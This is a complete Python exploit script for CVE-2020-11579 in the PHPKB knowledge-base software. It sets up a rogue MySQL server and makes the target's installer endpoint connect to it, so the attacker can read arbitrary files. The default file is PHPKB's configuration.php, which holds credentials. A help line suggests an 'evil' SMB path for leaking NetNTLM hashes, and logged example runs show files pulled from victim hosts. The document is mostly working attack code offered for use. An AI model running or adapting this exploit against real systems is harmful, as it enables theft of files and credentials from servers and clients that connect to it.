#!/usr/bin/env python3
# coding: utf8
#
# this script exploits CVE-2020-11579, an arbitrary file
# disclosure through a MySQL client in
# PHPKB (https://www.knowledgebase-script.com/).
#
# usage: CVE-2020-11579.py [-h] [-rh RHOST] -lh LHOST [-lp LPORT] [-f FILE]
#                          [-c {mysql_cli,mysqlnd}] [-s] [-d] [-o OUTPUT_FILE]
#
# optional arguments:
#   -h, --help            show this help message and exit
#   -rh RHOST, --rhost RHOST
#                         remote PHPKB webroot, e.g.:
#                         http://10.10.10.11:8080/phpkbv9
#   -lh LHOST, --lhost LHOST
#                         local host ip/hostname to expose the rogue mysql
#                         server at
#   -lp LPORT, --lport LPORT
#                         local port to expose the rogue mysql server at
#   -f FILE, --file FILE  remote file to exfiltrate, e.g.
#                         `\\evil.smb.server.ip\netntlm\leak.jpg` or PHPKB's
#                         `../../admin/include/configuration.php`
#   -c {mysql_cli,mysqlnd}, --configuration {mysql_cli,mysqlnd}
#   -s, --server-only     start rogue mysql server and wait
#   -d, --debug           enable debug mode
#   -o OUTPUT_FILE, --output-file OUTPUT_FILE
#                         save exfiltrated file to path
# example PHPKB run:
# $ ./CVE-2020-11579.py -rh http://192.168.252.130 -lh 0.0.0.0 -f '/etc/issue' -lp 3308 -d
# 2020-03-17 06:22:22,796 - INFO - triggering mysql connection...
# 2020-03-17 06:22:23,804 - INFO - new connection from 192.168.252.130:55628:
# 2020-03-17 06:22:23,804 - DEBUG - server -> client: (Server Greeting)
# 0000 50 00 00 00 0a 35 2e 31 2e 36 36 2d 30 2b 73 71 P....5.1.66-0+sq
# 0000 75 65 65 7a 65 31 00 36 00 00 00 31 32 33 34 35 ueeze1.6...12345
# 0000 36 37 38 00 df f7 08 02 00 00 00 15 00 00 00 00 678.............
# 0030 00 00 00 00 00 00 77 68 61 74 65 76 65 72 00 6d ......whatever.m
# 0040 79 73 71 6c 5f 6e 61 74 69 76 65 5f 70 61 73 73 ysql_native_pass
# 0050 77 6f 72 64                                     word
# 2020-03-17 06:22:23,805 - DEBUG - client -> server: (len)
# 0000 55 00 00                                        U..
# 2020-03-17 06:22:23,805 - DEBUG - client -> server: (data)
# 0000 01 8d a2 0a 00 00 00 00 c0 08 00 00 00 00 00 00 ................
# 0000 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
# 0000 00 74 65 73 74 00 14 fe 23 45 40 fd 5b 09 3e c8 .test...#E@.[.>.
# 0030 37 69 3b b0 c8 f8 9b fb 44 a0 0f 74 65 73 74 00 7i;.....D..test.
# 0040 6d 79 73 71 6c 5f 6e 61 74 69 76 65 5f 70 61 73 mysql_native_pas
# 0050 73 77 6f 72 64 00                               sword.
# 2020-03-17 06:22:23,805 - INFO - received login info and client capabilities ^
# 2020-03-17 06:22:23,805 - INFO - client has LOAD DATA LOCAL bit set (good)
# 2020-03-17 06:22:23,805 - DEBUG - server -> client: (Response OK)
# 0000 07 00 00 02 00 00 00 02 00 00 00                ...........
# 2020-03-17 06:22:23,805 - INFO - fake authentication finished
# 2020-03-17 06:22:23,806 - DEBUG - client -> server: (len)
# 0000 0f 00 00                                        ...
# 2020-03-17 06:22:23,806 - DEBUG - client -> server: (data)
# 0000 00 03 53 45 54 20 4e 41 4d 45 53 20 75 74 66 38 ..SET NAMES utf8
# 2020-03-17 06:22:23,806 - INFO - received Request Query (this is going to be ignored) ^
# 2020-03-17 06:22:23,806 - DEBUG - server -> client: (file request / response TABULAR)
# 0000 0b 00 00 01 fb 2f 65 74 63 2f 69 73 73 75 65    ...../etc/issue
# 2020-03-17 06:22:23,806 - DEBUG - client -> server: (len)
# 0000 1a 00 00                                        ...
# 2020-03-17 06:22:23,806 - DEBUG - client -> server: (data)
# 0000 02 55 62 75 6e 74 75 20 31 36 2e 30 34 2e 36 20 .Ubuntu 16.04.6
# 0000 4c 54 53 20 5c 6e 20 5c 6c 0a 0a                LTS \n \l..
# 2020-03-17 06:22:23,806 - INFO - received file contents ^
# 2020-03-17 06:22:23,807 - DEBUG - client -> server: (len)
# 0000 00 00 00                                        ...
# 2020-03-17 06:22:23,807 - DEBUG - client -> server: (data)
# 0000 03                                              .
# 2020-03-17 06:22:23,807 - DEBUG - server -> client: (Response OK)
# 0000 07 00 00 04 00 00 00 02 00 00 00                ...........
# 2020-03-17 06:22:23,807 - INFO - file exfiltration finished
# 2020-03-17 06:22:23,807 - CRITICAL - Successfully extracted file from 192.168.252.130:55628:
# Ubuntu 16.04.6 LTS \n \l
#
#
# 2020-03-17 06:22:23,807 - DEBUG - client -> server: (len)
# 0000 01 00 00                                        ...
# 2020-03-17 06:22:23,807 - DEBUG - client -> server: (data)
# 0000 00 01                                           ..
# 2020-03-17 06:22:23,807 - INFO - received request command quit ^
# 2020-03-17 06:22:23,807 - DEBUG - server -> client: (quitting)
# 0000 00                                              .
# 2020-03-17 06:22:23,809 - INFO - mySQL connection successfully triggered
# 2020-03-17 06:22:23,809 - INFO - stopping the server...
# $
#
# example server-only run:
# $ ./CVE-2020-11579.py -lh 0.0.0.0 -s -d -c mysql_cli -f '/etc/issue'
# 2020-07-15 15:12:18,541 - CRITICAL - Evil mysql server is now listening on 0.0.0.0:3306 -- CTRL-C once done
# 2020-07-15 15:12:29,530 - INFO - new connection from 127.0.0.1:16610
# 2020-07-15 15:12:29,532 - DEBUG - client <- server: (Server Greeting)
# 0000 3f 00 00 00 0a 35 2e 31 2e 36 36 2d 30 2b 73 71 ?....5.1.66-0+sq
# 0010 75 65 65 7a 65 31 00 36 00 00 00 7a 42 7a 60 51 ueeze1.6...zBz`Q
# 0020 56 3b 64 00 ff f7 08 02 00 f7 80 00 00 00 00 00 V;d.............
# 0030 00 00 00 00 00 00 64 4c 2f 44 47 77 43 2a 43 56 ......dL/DGwC*CV
# 0040 63 72 00                                        cr.
# 2020-07-15 15:12:29,534 - WARNING - if the client now stops responding retry after changing the configuration in use via -c/--configuration, the current set has been tested with success on these clients:
#         - mysql-cli Ver 14.14 Distrib 5.7.30, for Linux (x86_64)
#         - MySQL Workbench Ver 8.0.19 for Win64 on x86_64
#         - MySQL Workbench Ver 8.0.21 for Win64 on x86_64
# 2020-07-15 15:12:29,535 - DEBUG - client -> server: (len)
# 0000 a0 00 00                                        ...
# 2020-07-15 15:12:29,536 - DEBUG - client -> server: (data)
# 0000 01 85 a6 ff 01 00 00 00 01 21 00 00 00 00 00 00 .........!......
# 0010 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................
# 0020 00 74 65 73 74 00 14 b5 49 03 c0 69 31 18 09 e7 .test...I..i1...
# 0030 07 cf eb 1a a8 6e f3 60 95 5f 19 65 03 5f 6f 73 .....n.`._.e._os
# 0040 05 4c 69 6e 75 78 0c 5f 63 6c 69 65 6e 74 5f 6e .Linux._client_n
# 0050 61 6d 65 08 6c 69 62 6d 79 73 71 6c 04 5f 70 69 ame.libmysql._pi
# 0060 64 04 32 30 34 37 0f 5f 63 6c 69 65 6e 74 5f 76 d.2047._client_v
# 0070 65 72 73 69 6f 6e 06 35 2e 37 2e 33 30 09 5f 70 ersion.5.7.30._p
# 0080 6c 61 74 66 6f 72 6d 06 78 38 36 5f 36 34 0c 70 latform.x86_64.p
# 0090 72 6f 67 72 61 6d 5f 6e 61 6d 65 05 6d 79 73 71 rogram_name.mysq
# 00A0 6c                                              l
# 2020-07-15 15:12:29,537 - INFO - received login info and client capabilities ^
# 2020-07-15 15:12:29,538 - INFO - client has LOAD DATA LOCAL bit set (good)
# 2020-07-15 15:12:29,538 - DEBUG - client <- server: (Response OK)
# 0000 07 00 00 02 00 00 00 02 00 00 00                ...........
# 2020-07-15 15:12:29,539 - INFO - fake authentication finished
# 2020-07-15 15:12:29,539 - DEBUG - client -> server: (len)
# 0000 21 00 00                                        !..
# 2020-07-15 15:12:29,539 - DEBUG - client -> server: (data)
# 0000 00 03 73 65 6c 65 63 74 20 40 40 76 65 72 73 69 ..select @@versi
# 0010 6f 6e 5f 63 6f 6d 6d 65 6e 74 20 6c 69 6d 69 74 on_comment limit
# 0020 20 31                                            1
# 2020-07-15 15:12:29,540 - INFO - received Request Query (this is going to be ignored) ^
# 2020-07-15 15:12:29,541 - DEBUG - client <- server: (file request / response TABULAR)
# 0000 0b 00 00 01 fb 2f 65 74 63 2f 69 73 73 75 65    ...../etc/issue
# 2020-07-15 15:12:29,550 - DEBUG - client -> server: (len)
# 0000 1a 00 00                                        ...
# 2020-07-15 15:12:29,551 - DEBUG - client -> server: (data)
# 0000 02 55 62 75 6e 74 75 20 31 38 2e 30 34 2e 32 20 .Ubuntu 18.04.2
# 0010 4c 54 53 20 5c 6e 20 5c 6c 0a 0a                LTS \n \l..
# 2020-07-15 15:12:29,552 - INFO - received file contents ^
# 2020-07-15 15:12:29,552 - DEBUG - client -> server: (len)
# 0000 00 00 00                                        ...
# 2020-07-15 15:12:29,553 - DEBUG - client -> server: (data)
# 0000 03                                              .
# 2020-07-15 15:12:29,553 - DEBUG - client <- server: (Response OK)
# 0000 07 00 00 04 00 00 00 02 00 00 00                ...........
# 2020-07-15 15:12:29,554 - INFO - file exfiltration finished
# 2020-07-15 15:12:29,554 - CRITICAL - Successfully extracted file from 127.0.0.1:16610:
# Ubuntu 18.04.2 LTS \n \l
#
#
# 2020-07-15 15:12:30,874 - DEBUG - client -> server: (len)
# 0000 01 00 00                                        ...
# 2020-07-15 15:12:30,876 - DEBUG - client -> server: (data)
# 0000 00 01                                           ..
# 2020-07-15 15:12:30,877 - INFO - received request command quit ^
# 2020-07-15 15:12:30,878 - DEBUG - client <- server: (quitting)
# 0000 00
# $
#
# successfully tested on:
# * Linux ubuntu 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64
#   Apache/2.4.18 (Ubuntu)
#   PHP Version 5.6.40-24+ubuntu16.04.1+deb.sury.org+1
#   mysqlnd 5.0.11-dev - 20120503 - $Id: 76b08b24596e12d4553bd41fc93cccd5bac2fe7a $
#
# * Windows NT WIN-S4KI67792EN 10.0 build 17763 (Windows Server 2016) i586
#   Microsoft IIS 10.0
#   PHP Version 5.6.31
#   mysqlnd 5.0.11-dev - 20120503 - $Id: 76b08b24596e12d4553bd41fc93cccd5bac2fe7a $
#
# * Windows NT WIN-S4KI67792EN 10.0 build 17763 (Windows Server 2016) i586
#   mysql workbench Ver 8.0.19 for Win64 on x86_64
#
# * Microsoft Windows 10 Pro 10.0.19041
#   mysql workbench Ver 8.0.21 for Win64 on x86_64
#
# * Ubuntu 18.04 WSL 4.4.0-19041-Microsoft #1-Microsoft Fri Dec 06 14:06:00 PST 2019 x86_64 x86_64 x86_64 GNU/Linux
#   mysql  Ver 14.14 Distrib 5.7.30, for Linux (x86_64) using  EditLine wrapper
#
# this script is based on the original rogue server
# https://github.com/Gifts/Rogue-MySql-Server/blob/master/rogue_mysql_server.py
# -- thanks @Gifts!
#
# polict, 10/03/2020

# mysql server requirements
import threading
import socket
import asyncore
import asynchat
import struct
import random
import logging
import logging.handlers
import time
import codecs
from enum import Enum
from argparse import ArgumentParser
import sys

# default settings
DEFAULT_FILE = "../../admin/include/configuration.php"
DEFAULT_PORT = 3306

# supported clients
class Configuration(Enum):
    mysqlnd = {
        "tested_versions": [
            "mysqlnd 5.0.11-dev - 20120503 - $Id: 76b08b24596e12d4553bd41fc93cccd5bac2fe7a $"
        ],
        "server_greeting": {
            "server_caps": b'\xdf\xf7',
            "ext_server_caps": b'\x00\x00',
            "auth_plugin": "mysql_native_password".encode()
        }
    }
    mysql_cli = {
        "tested_versions": [
            "mysql-cli Ver 14.14 Distrib 5.7.30, for Linux (x86_64)",
            "MySQL Workbench Ver 8.0.19 for Win64 on x86_64",
            "MySQL Workbench Ver 8.0.21 for Win64 on x86_64"
        ],
        "server_greeting": {
            "server_caps": b'\xff\xf7',
            "ext_server_caps": b'\xf7\x80',
            # these clients don't like it in the server greeting
            "auth_plugin": b''
        }
    }
    # add here any new client configuration

    def __str__(self):
        return self.name.lower()

    def __repr__(self):
        return str(self)

    @staticmethod
    def argparse(s):
        try:
            return Configuration[s.lower()]
        except KeyError:
            return s

# this is raised at the end of each state: authentication, file exfiltration, ...
# to keep track of the mysql protocol
class LastPacketOfState(Exception):
    pass

"""
MySQL packet iterator
"""
class PacketIterator:
    def __init__(self, mysql_pkt):
        self.packet = mysql_pkt.header + mysql_pkt.payload
        self.index = 0

    def __next__(self):
        if self.index >= len(self.packet):
            raise StopIteration
        retval = self.packet[self.index]
        self.index += 1
        return retval

"""
MySQL packet parsing and representation class
"""
class mysql_packet(object):
    packet_header = struct.Struct('<Hbb')
    packet_header_long = struct.Struct('<Hbbb')
    def __init__(self, packet_type, payload):
        self.header = b''
        if isinstance(packet_type, mysql_packet):
            self.packet_num = packet_type.packet_num + 1
        else:
            self.packet_num = packet_type
        self.payload = payload

    def __str__(self):
        return bytes(self).encode('utf-8', 'ignore')

    def __repr__(self):
        return repr(str(self))

    def __iter__(self):
        return PacketIterator(self)

    @staticmethod
    def parse(raw_data):
        packet_num = raw_data[0]
        payload = raw_data[1:]

        return mysql_packet(packet_num, payload)

    def bytes(self):
        payload_len = len(self.payload)
        if payload_len < 65536:
            self.header = mysql_packet.packet_header.pack(payload_len,
            0, self.packet_num)
        else:
            self.header = mysql_packet.packet_header.pack(payload_len & 0xFFFF,
            payload_len >> 16, 0, self.packet_num)
        return self.header + self.payload

def can_client_use_load_data_local(mysql_packet):
    # \x05\xa6... -> \xa6\x05
    client_caps = mysql_packet[:2][::-1]
    client_caps = int(codecs.encode(client_caps, 'hex'), 16)
    # reference: https://dev.mysql.com/doc/internals/en/capability-flags.html
    return ((client_caps & 0x80) == 0x80)

def is_character_printable(c):
  # check if char is printable
  return (c < 127 and c >= 32)

def hexdump(packet):
    ascii_string = ""
    memory_address = 0
    hexdump_string = ""
    for byte in packet:
        ascii_string = ascii_string + \
            (chr(byte) if is_character_printable(byte) else '.')
        if memory_address%16 == 0:
            # add address
            hexdump_string += format(memory_address, '04X') + " "
            hexdump_string += codecs.encode(bytes([byte]), 'hex').decode() + " "
        elif memory_address%16 == 15:
            hexdump_string += codecs.encode(bytes([byte]), 'hex').decode() + " "
            # add ascii chars
            hexdump_string += ascii_string + "\n"
            ascii_string = ""
        else:
            hexdump_string += codecs.encode(bytes([byte]), 'hex').decode() + " "
        memory_address = memory_address + 1

    # check if last line is not full
    if len(ascii_string) > 0:
        # append spaces to be aligned
        hexdump_string += ' ' * (70 - (len(hexdump_string) % 70) - 17)
        # append remaining ascii chars
        hexdump_string += ascii_string
    return hexdump_string.rstrip("\n")

class tcp_request_handler(asynchat.async_chat):
    global args
    def __init__(self, addr):
        asynchat.async_chat.__init__(self, sock=addr[0])
        self.addr = addr[1]
        self.conf = args.configuration.value
        self.ibuffer = []
        # the first 3 bytes contain the mysql packet's len
        self.set_terminator(3)
        self.state = 'LEN'
        self.sub_state = 'Auth'
        self.extracted_file = b''
        self.push(
            mysql_packet(
                0,
                    # reference: https://dev.mysql.com/doc/internals/en/connection-phase-packets.html
                    b'\x0a' +                                                         # protocol
                    '5.1.66-0+squeeze1'.encode() + b'\0' +                            # server version
                    b'\x36\x00\x00\x00' +                                             # thread ID
                    'zBz`QV;d'.encode() + b'\0' +                                     # salt
                    self.conf['server_greeting']['server_caps'] +                     # server capabilities
                    b'\x08' +                                                         # server language: latin1 collate latin1_swedish_ci
                    b'\x02\x00' +                                                     # server status
                    self.conf['server_greeting']['ext_server_caps'] +                 # extended server capabilities
                    chr(len(self.conf['server_greeting']['auth_plugin'])).encode() +  # auth plugin's (last attribute) length
                    b'\x00' * 10 +                                                    # unused
                    'dL/DGwC*CVcr'.encode() + b'\0' +                                 # salt
                    self.conf['server_greeting']['auth_plugin']                       # auth plugin
            ).bytes(), "Server Greeting"
        )
        # the client might abort the handshake now, show warning and instructions
        log.warning("if the client now stops responding retry after changing the configuration in use via -c/--configuration, "
        "the current set has been tested with success on these clients: \n\t- {}".format("\n\t- ".join(self.conf['tested_versions'])))

    def push(self, data, label="?"):
        log.debug('client (%s:%s) <- server: (%s)\n%s', self.addr[0], self.addr[1], label, hexdump(data))
        asynchat.async_chat.push(self, data)

    def send_response_ok(self, packet):
        self.push(mysql_packet(
                packet, b'\0\0\0\x02\0\0\0'
            ).bytes(), "Response OK")

    def collect_incoming_data(self, data):
        if len(data) == 3:
            log.debug('client (%s:%s) -> server: (len)\n%s', self.addr[0], self.addr[1], hexdump(data))
        else:
            log.debug('client (%s:%s) -> server: (data)\n%s', self.addr[0], self.addr[1], hexdump(data))
        self.ibuffer += data

    def found_terminator(self):
        data = self.ibuffer
        self.ibuffer = b''
        # we read the length first
        if self.state == 'LEN':
            len_bytes = data[0] + 256*data[1] + 65536*data[2] + 1
            if len_bytes < 65536:
                self.set_terminator(len_bytes)
                self.state = 'Data'
            else:
                self.state = 'MoreLength'

        # special case if packet len >= 65536 bytes
        elif self.state == 'MoreLength':
            if data[0] != 0:
                self.push(b'\x00', "closing socket")
                self.close_when_done()
            else:
                self.state = 'Data'

        # actual mysql packet payload
        elif self.state == 'Data':
            packet = mysql_packet.parse(data)
            try:
                if packet.packet_num == 0:
                    if packet.payload[0] == 3:
                        log.info('received Request Query (this is going to be ignored) ^')

                        PACKET = mysql_packet(
                            packet,
                            b'\xFB' + args.file.encode()
                        )
                        self.set_terminator(3)
                        self.state = 'LEN'
                        self.sub_state = 'File'
                        self.push(PACKET.bytes(),"file request / response TABULAR")
                    elif packet.payload[0] == 1:
                        log.info("received request command quit ^")
                        self.push(b'\x00', 'quitting the connection')
                        self.close_when_done()
                    else:
                        pass
                else:
                    if self.sub_state == 'File':
                        if len(data) == 1:
                            self.send_response_ok(packet)
                            log.info("file exfiltration finished")

                            if len(self.extracted_file):
                                log.critical("Successfully extracted file from {}:{}:\n{}".format(
                                    self.addr[0], self.addr[1], ''.join(self.extracted_file.decode())))
                                if args.output_file is not None:
                                    try:
                                        with open(args.output_file, 'wb') as f:
                                            f.write(self.extracted_file)
                                        log.info("extracted file saved to %s", args.output_file)
                                    except Exception as e:
                                        log.error("Error while trying to save exfiltrated file: %s", e)
                            else:
                                log.critical("file extraction failed (check in debug mode with -d)")

                            self.extracted_file = b''
                            raise LastPacketOfState()
                        else:
                            log.info('received file contents ^')
                            # append to exfiltrated file
                            self.extracted_file += data[1:]

                            self.set_terminator(3)
                            self.state = 'LEN'
                    elif self.sub_state == 'Auth':
                        log.info('received login info and client capabilities ^')
                        if can_client_use_load_data_local(packet.payload) is False:
                            log.critical("Target client has LOAD DATA LOCAL bit NOT set \
                                -- exploit will probably fail...")
                        else:
                            log.info('client has LOAD DATA LOCAL bit set (good)')
                        self.send_response_ok(packet)
                        log.info("fake authentication finished")
                        raise LastPacketOfState()
                    else:
                        log.warning("??? couldn't recognize state ???")
                        raise ValueError('Unknown packet')
            except LastPacketOfState:
                # once we finish every state (e.g.: authentication, file exfiltration, ...)
                # we reset the packet reader to continue with the next one
                self.state = 'LEN'
                self.sub_state = None
                self.set_terminator(3)
        else:
            log.error('Unknown state')
            self.push(b'\x00')
            self.close_when_done()

class mysql_listener(asyncore.dispatcher):
    global args
    def __init__(self, sock=None):
        asyncore.dispatcher.__init__(self, sock)

        if not sock:
            self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
            self.set_reuse_addr()
            try:
                self.bind((args.lhost, args.lport))
            except socket.error as e:
                log.error("Error while binding to local port: {}".format(e))
                exit()

            self.listen(5)

    def handle_accept(self):
        pair = self.accept()
        self.ip = pair[1][0]
        self.port = pair[1][1]

        if pair is not None:
            log.info("new connection from {}:{}".format(self.ip, self.port))
            tmp = tcp_request_handler(pair)

class exploit_listener(object):
    def __init__(self):
        self.mysql = mysql_listener()
        self.thread = threading.Thread()

    def start(self):
        self.thread = threading.Thread(
            target=asyncore.loop, kwargs={'timeout': 1})
        self.thread.daemon = True
        self.thread.start()

    def stop(self):
        self.mysql.close()
        self.thread.join()

parser = ArgumentParser()
parser.add_argument("-rh", "--rhost", dest="rhost",
            help="remote PHPKB webroot, e.g.: http://10.10.10.11:8080/phpkbv9")
parser.add_argument("-lh", "--lhost", dest="lhost",
            help="local host ip/hostname to expose the rogue mysql server at",
            required=True)
parser.add_argument("-lp", "--lport", dest="lport",
            default=DEFAULT_PORT, help="local port to expose the rogue mysql server at",
            type=int)
parser.add_argument("-f", "--file", dest="file",
            default=DEFAULT_FILE,
            help="remote file to exfiltrate, e.g. `\\\\evil.smb.server.ip\\netntlm\\leak.jpg` \
                or PHPKB's `../../admin/include/configuration.php`")
parser.add_argument('-c', '--configuration', dest="configuration",
            type=Configuration.argparse,
            # mysqlnd has been the most popular so far
            default='mysqlnd', choices=list(Configuration))
parser.add_argument("-s", "--server-only", dest="server_only",
            action="store_true",
            help="start rogue mysql server and wait")
parser.add_argument("-d", "--debug", dest="debug_mode",
            action="store_true",
            help="enable debug mode")
parser.add_argument("-o", '--output-file',dest="output_file",
            help="save exfiltrated file to path")
args = parser.parse_args()

log = logging.getLogger(__name__)
if args.debug_mode:
    log.setLevel(logging.DEBUG)
else:
    log.setLevel(logging.ERROR)

handler = logging.StreamHandler(sys.stdout)
handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
log.addHandler(handler)

# start mysql rogue listener
rogue_server = exploit_listener()
rogue_server.start()

if args.server_only:
    try:
        log.critical("Evil mysql server is now listening \
on {}:{} -- CTRL-C once done".format(args.lhost, args.lport))
        while True:
            time.sleep(0.1)
    except KeyboardInterrupt:
        rogue_server.stop()
        exit()

if args.rhost is None:
    parser.print_help()
    exit(1)

# http request trigger requirements
import requests, sys
requests.packages.urllib3.disable_warnings()

log.info("triggering mysql connection...")
# avoid race condition
time.sleep(1)

# trigger file exfiltration
trigger_fe = requests.get("{}/installer/include/test-connection.php?mys={}:{}&myu=test&myp=test&myd=test".format(
    args.rhost, args.lhost, args.lport))
if trigger_fe.status_code == 200 and \
    "Connection established successfully" in trigger_fe.text:
    log.info("MySQL connection successfully triggered")

log.info("stopping the server...")
rogue_server.stop()